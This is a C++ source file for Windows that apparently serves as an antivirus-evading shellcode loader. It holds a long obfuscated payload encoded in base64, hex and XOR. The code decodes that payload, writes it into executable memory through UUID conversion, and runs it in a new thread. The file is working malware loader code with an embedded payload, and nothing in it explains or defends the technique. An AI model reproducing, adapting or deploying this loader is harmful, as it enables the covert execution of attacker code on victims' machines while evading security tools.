#include <iostream>
#include <Windows.h>
#include <utility>
#include <map>
#include <string>

using namespace std;

#pragma comment(lib, "Rpcrt4.lib")

static const std::string base64_chars =
"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
"abcdefghijklmnopqrstuvwxyz"
"0123456789+/";

std::string base64_encode(char const* bytes_to_encode, int in_len);
std::string base64_decode(std::string& encoded_string);
std::string string_to_hex(const std::string& input);
std::string hex_to_xor(const std::string& input);
map<int, string> UUIDEncode(const std::string& input);

int WINAPI WinMain(HINSTANCE hInstance,      // handle to current instance
    HINSTANCE hPrevInstance,  // handle to previous instance
    LPSTR lpCmdLine,          // command line
    int nCmdShow              // show state
)
{string shellcode = "NmFkZTE1NzI2NjdlNWU5Njk2OTZkN2M3ZDdjNmM0YzdjMGRlYTc0NGYzZGUxZGM0ZjZkZTFkYzQ4ZWRlMWRjNGI2ZGUxZGU0YzZkZTk5MjFkY2RjZGJhNzVmZGVhNzU2M2FhYWY3ZWE5NGJhYjZkNzU3NWY5YmQ3OTc1Nzc0N2JjNGQ3YzdkZTFkYzRiNjFkZDRhYWRlOTc0NmYwMTdlZThlOWQ5NGUzZTQxZDE2MWU5Njk2OTZkZTEzNTZlMmYxZGU5NzQ2YzYxZGRlOGVkMjFkZDZiNmRmOTc0Njc1YzBkZTY5NWZkNzFkYTIxZWRlOTc0MGRiYTc1ZmRlYTc1NjNhZDc1NzVmOWJkNzk3NTdhZTc2ZTM2N2RhOTVkYWIyOWVkM2FmNDdlMzRlY2VkMjFkZDZiMmRmOTc0NmYwZDcxZDlhZGVkMjFkZDY4YWRmOTc0NmQ3MWQ5MjFlZGU5NzQ2ZDdjZWQ3Y2VjOGNmY2NkN2NlZDdjZmQ3Y2NkZTE1N2FiNmQ3YzQ2OTc2Y2VkN2NmY2NkZTFkODQ3ZmQ5Njk2OTY5Y2JmYzk2ZGYyOGUxZmZmOGZmZjhmM2UyOTZkN2MwZGYxZjcwZGExZjY3ZDcyY2RhZTFiMDkxNjk0M2RlYTc1ZmRlYTc0NGRiYTc1NmRiYTc1ZmQ3YzZkN2M2ZDcyY2FjYzBlZjMxNjk0MzdmMDU5Njk2OTZjY2RlMWY1N2Q3MmU3YjgwOTY5NmRiYTc1ZmQ3YzdkN2M3ZmM5NWQ3YzdkNzJjYzExZjA5NTA2OTQzN2RlZmNkZGUxZjU3ZGVhNzQ0ZGYxZjRlZGJhNzVmYzRmZTk2YTQ1NjEyYzRjNGQ3MmM3ZGMzYjhhZDY5NDNkZTFmNTBkZTE1NTVjNmZjOWNjOWRlMWY2NzJjODk5Njk2OTZmYzk2ZmUxNmE1OTY5NmRmMWY3NmQ3MmY5Mjk2OTY5NmQ3MmNlM2QwMDgxMDY5NDNkZTFmNjdkZTFmNGNkZjUxNTY2OTY5Njk2OWRiYTc1ZmM0YzRkNzJjYmI5MDhlZWQ2OTQzMTM1Njk5MTMwYjk3OTY5NmRlNjk1OTk5MTIxYTk3OTY5NjdkMjU3ZjcyOTc5Njk2N2UxNDY5Njk2OWI5ZjRmOWY5ZTJlNWUyZTRmN2U2YmJhNGI4ZmJmZmY4YjhmY2U1OTY1MmIzMmQxOWNhM2IwMWM2M2I5MDJiNDAwODRmODc3Y2ViMmY0MDg2NDhiMmU3N2FjMDU0YjEwNTg0NGRiYmExMjY3ODZjNDk1NWZmMTdjOTA1YjA5YzFkM2Q5NmEzNmJmOWMzMGQ3ZmIxMjc1OTJjMDlmMWQxOTZjM2U1ZjNlNGJiZDdmMWYzZjhlMmFjYjZkYmY5ZWNmZmZhZmFmN2I5YTNiOGE2YjZiZWY1ZjlmYmU2ZjdlMmZmZjRmYWYzYWRiNmRiYzVkZmQzYjZhN2E2YjhhNmFkYjZjMWZmZjhmMmY5ZTFlNWI2ZDhjMmI2YTFiOGE2YWRiNmRmZjhmMGY5YzZmN2UyZmViOGE1YWRiNmI4ZDhkM2MyYjZkNWRhYzRiNmE1YjhhN2I4YTJhNmExYTBhMWFkYjZjMmU0ZmZmMmYzZjhlMmI5YTBiOGE2YWRiNmYzZjhiYmRmZDhiZjliOWM5NmVjMWFkYjJjNzJiZGJiOThiYWY1OGI2NzcxYjNlY2YzNDM5MmU1ZTE0MTJiNTRiMWU2ZDYzMzllN2Q5Y2E4YWVmOGRjNzgyMjA1MWYzMTBhODU0M2FmMDJkNjM4ZWJlZWFkNWFmOWNmYTk1OWFmYjE3MTE2NGMwMDNiMTI3MDM2NTY2M2UxMWEyZGJlMjNkMWFiNzYzNzMwNzYxNWNjM2JiYzVlMTgxYmI1Mzg4NTg5M2RjNWNhMTZiMjBjMDQwYzhiZmNhNWY5MDRmYzg3MzA1YWZhZGNhOTQ3NWM4ZjE2YWJiM2Y0OTg5YzUwNzI5NzdlYzZiNTFmMjc5MDQ3NzhmYjM1OWYyYmFmZmE1ZDVlMmIxYjZiZTdjNTE4YTZkNzlkNTdlODQzYmE5NGE4ZWZiMzZhYjQ2MDU1MWViMjM4ZTFmMTA5YzIxYjljY2U2MTZhMzdlODU0NjNjYjgyYmE0Yjk5NDBlMjA5NmQ1YzhjZGI5NmQ3Mjg2NjIzMzRjMDY5NDNkZWE3NWYyYzk2OTZkNjk2ZDcyZTk2ODY5Njk2ZDcyZmQ2OTY5Njk2ZDcyY2NlMzJjNTczNjk0M2RlMDVjNWM1ZGUxZjcxZGUxZjY3ZGUxZjRjZDcyZTk2YjY5Njk2ZGYxZjZmZDcyYzg0MDAxZjc0Njk0M2RlMTU1MmI2MTM1NmUyMjBmMDFkOTFkZTk3NTUxMzU2ZTM0MWNlY2VjZWRlOTM5Njk2OTY5NmM2NTU3ZWU5NmI2OTY5YTdhN2EyYjhhN2E3YTNiOGE3YTBhMmI4YTdhM2ExOTY4ZmZmMzYxYjY5";
   std::string decoded = base64_decode(shellcode);
    string str = string_to_hex(decoded);
    string sh3llc0de = hex_to_xor(str);
    map<int, string> list = UUIDEncode(sh3llc0de);

	LPVOID  rwxpage = VirtualAlloc(0, list.size() * 16, 0x3000, 0x40);
	UUID* uuid;
	uuid = (UUID *) rwxpage;
	int i = 0;
	for (auto value : list)
	{
		UuidFromStringA((unsigned char*)value.second.data(), uuid);
		uuid++;
	}

	HANDLE  hanndle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)rwxpage, 0, 0, 0);
	WaitForSingleObject(hanndle, -1);

	return 0;
}

static inline bool is_base64(unsigned char c) {
    return (isalnum(c) || (c == '+') || (c == '/'));
}
//A\nB                          3
std::string base64_encode(char const* bytes_to_encode, int in_len) {
    std::string ret;
    int i = 0;
    int j = 0;
    unsigned char char_array_3[3];
    unsigned char char_array_4[4];

    while (in_len--) {
        char_array_3[i++] = *(bytes_to_encode++);
        if (i == 3) {
            char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
            char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
            char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
            char_array_4[3] = char_array_3[2] & 0x3f;

            for (i = 0; (i < 4); i++)
                ret += base64_chars[char_array_4[i]];
            i = 0;
        }
    }

    if (i)
    {
        for (j = i; j < 3; j++)
            char_array_3[j] = '\0';

        char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
        char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
        char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
        char_array_4[3] = char_array_3[2] & 0x3f;

        for (j = 0; (j < i + 1); j++)
            ret += base64_chars[char_array_4[j]];

        while ((i++ < 3))
            ret += '=';

    }

    return ret;

}

std::string base64_decode(std::string& encoded_string) {
    int in_len = encoded_string.size();
    int i = 0;
    int j = 0;
    int in_ = 0;
    unsigned char char_array_4[4], char_array_3[3];
    std::string ret;

    while (in_len-- && (encoded_string[in_] != '=') && is_base64(encoded_string[in_])) {
        char_array_4[i++] = encoded_string[in_]; in_++;
        if (i == 4) {
            for (i = 0; i < 4; i++)
                char_array_4[i] = base64_chars.find(char_array_4[i]);

            char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
            char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
            char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

            for (i = 0; (i < 3); i++)
                ret += char_array_3[i];
            i = 0;
        }
    }

    if (i) {
        for (j = i; j < 4; j++)
            char_array_4[j] = 0;

        for (j = 0; j < 4; j++)
            char_array_4[j] = base64_chars.find(char_array_4[j]);

        char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
        char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
        char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

        for (j = 0; (j < i - 1); j++) ret += char_array_3[j];
    }

    return ret;
}

std::string string_to_hex(const std::string& input)
{
    std::string output;
    size_t len = input.length();

    map<char, unsigned int> char_to_int = {
    {'0',0x0},{'1',0x1},{'2',0x2},{'3',0x3},
    {'4',0x4},{'5',0x5},{'6',0x6},{'7',0x7},
    {'8',0x8},{'9',0x9},{'a',0xa},{'b',0xb},
    {'c',0xc},{'d',0xd},{'e',0xe},{'f',0xf}
    };

    for (unsigned int i = 0; i < len; i++)
    {
        unsigned int n1 = char_to_int[input[i]] * 0x10;
        i++;
        unsigned int n2 = char_to_int[input[i]];
        unsigned int n = n1 + n2;
        char c = (char)n;
        output += c;
    }

    return output;
}

std::string hex_to_xor(const std::string& input)
{
    int nLen = input.size();
    int nKey = (int)input[nLen - 1];
    std::string output;
    for (int i = 0; i < nLen - 1; ++i)
    {
        int nTmp = (int)input[i];
        int n1 = 0xff - (nTmp ^ nKey);
        char cTmp = (char)n1;
        output += cTmp;
    }
    return output;
}


map<int, string> UUIDEncode(const std::string& input)
{
    string m_strShellCode = input;
    map<int, string> list;

    //补充0
    string strShellCode = m_strShellCode;
    uint32_t nLen = strShellCode.size();
    uint32_t nFill = 16 - (nLen % 16);
    for (uint32_t i = 0; i < nFill; ++i)
    {
        UCHAR cFill = 0x00;
        strShellCode += cFill;
    }

    //把Hex的shellcode转换为字符shellcode
    uint32_t nUuidCount = strShellCode.size() / 16;
    for (uint32_t i = 0; i < nUuidCount; ++i)
    {
        UCHAR szBuf[16];
        RPC_CSTR struuid;
        for (int j = 0; j < 16; ++j)
        {
            szBuf[j] = (&strShellCode[i * 16])[j];
        }

        UuidToStringA((UUID*)szBuf, &struuid);
        list[i] = (char*)struuid;
    }

    return list;
}